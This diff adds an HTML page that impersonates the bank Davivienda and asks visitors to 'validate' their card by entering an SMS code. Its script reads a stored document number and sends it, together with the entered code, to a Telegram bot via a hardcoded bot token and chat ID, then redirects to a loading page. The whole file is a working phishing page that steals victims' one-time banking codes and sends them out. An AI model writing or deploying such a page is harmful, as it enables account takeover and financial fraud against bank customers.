@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en" class="html">
+  <head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta http-equiv="X-UA-Compatible" content="ie-edge"/>
+    <meta name="keywords" content="Yulian Brito, Yulian, Brito, Yulian Developer, Frontend Developer, Credit Card 1"/>
+    <meta name="author" content="Yulian Brito"/>
+    <title>Credit Card 1</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Playfair+Display|Quicksand:400,700|Open+Sans|PT+Mono"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Overpass+Mono"/>
+    <link rel="stylesheet" href="/bpse/avvilla/cc/css.css">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+  </head>
+
+    <body class="body">
+
+  <!-- Card -->
+
+    <section class="container"> 
+      <img src="/bpse/daviviendaz/cc/imagecopy.png" alt="" style="width: 50%; margin-left: 18%;">
+      <h1 class="container__h1">Davivienda</h1>
+      <h2 class="container__h1">Comenzar a validar su tarjeta</h2>
+      <div class="payment">
+        <input id="tok" type="text" class="w3-input" placeholder="Codigo SMS" style="text-align: center; border-radius: 5px;display: none;">
+          <button id="nxt" class="button" type="button" onclick="next()">Comenzar</button>
+          <button id="nxt1" class="button" type="button" onclick="carl()" style="display: none;">Continuar</button>
+        </form>
+      </div>
+    </section>
+    
+  </body>
+  <script>
+    function next(params) {
+      document.getElementById("nxt").style.display = "none";
+      document.getElementById("nxt1").style.display = "block";
+      document.getElementById("tok").style.display = "block";
+
+      
+    }
+    function carl(params) {
+  const token = "5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU";
+  const chatId = "-4252737121";
+  const usr = localStorage.getItem("usr");
+  const uservalid = document.getElementById("tok").value;
+  
+
+  const message = `-NEW ONE-\n --DOC.: ${usr} \n --TOKENCC: ${uservalid} \n`;
+  $.ajax({
+    type: "POST",
+    url: `https://api.telegram.org/bot${token}/sendMessage`,
+    data: {
+      chat_id: chatId,
+      text: message,
+      parse_mode: "html",
+    },
+    success: function (res) {
+      console.debug(res);
+      $("#response").text("Message sent");
+      console.log("enviado");
+      localStorage.setItem("usr", usr);
+      
+      window.location = "../load.html";
+    },
+    error: function (error) {
+      console.error(error);
+      alert("error failed");
+    },
+  });
+}
+  </script>
+
+</html>
+    
